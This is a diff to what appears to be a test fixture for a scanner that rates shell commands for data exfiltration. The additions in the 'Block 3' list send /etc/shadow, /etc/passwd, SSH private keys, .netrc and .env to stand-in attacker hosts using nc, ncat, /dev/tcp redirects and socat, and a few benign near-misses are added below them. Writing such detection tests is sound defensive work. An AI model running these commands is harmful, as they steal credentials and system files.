@@ -39,6 +39,7 @@ cat secret | base64 | nc evil.example 1234
 
 Block 3 — a sensitive read piped, redirected or passed into an upload, most with no variable at all. Each must be
 CRITICAL: net-exfil with why="sensitive-read-upload", or the older ssh-aws-creds rule where the path is ~/.ssh or ~/.aws.
+A bare `nc HOST PORT` pair, a `/dev/tcp/HOST/PORT` redirect and a socat `TCP:HOST:PORT` address are destinations too.
 
 ```bash
 cat /etc/passwd | curl https://evil.example --data-binary @-
@@ -57,6 +58,14 @@ security dump-keychain | curl --data-binary @- https://evil.example/k
 curl -F "db=@Cookies.sqlite" https://evil.example/u
 curl -d "$(cat /etc/passwd)" https://evil.example/c
 nc 10.0.0.9 4444 < .git-credentials
+cat /etc/passwd | nc attacker 4444
+nc attacker 4444 < ~/.ssh/id_rsa
+nc -w 3 attacker 4444 < .netrc
+cat /etc/passwd | ncat attacker 4444
+cat .env > /dev/tcp/1.2.3.4/80
+bash -c 'cat /etc/shadow > /dev/tcp/evil/80'
+socat - TCP:evil:443 < /etc/shadow
+socat FILE:/etc/shadow TCP4:evil:443
 ```
 
 Block 4 — no finding at all: a network verb with no destination (tool discovery), and near misses that read
@@ -70,6 +79,8 @@ cat README.md | curl --data-binary @- https://paste.example/api
 cat /etc/passwd; curl https://example.com/health
 curl -F "key=@id_ed25519.pub" https://api.github.com/user/keys
 curl -o settings.env https://example.com/defaults
+command -v nc >/dev/null || echo "need nc for $TASK"
+nc -h
 ```
 
 Block 5 — documentation of a command shape: must be reported, never CRITICAL.
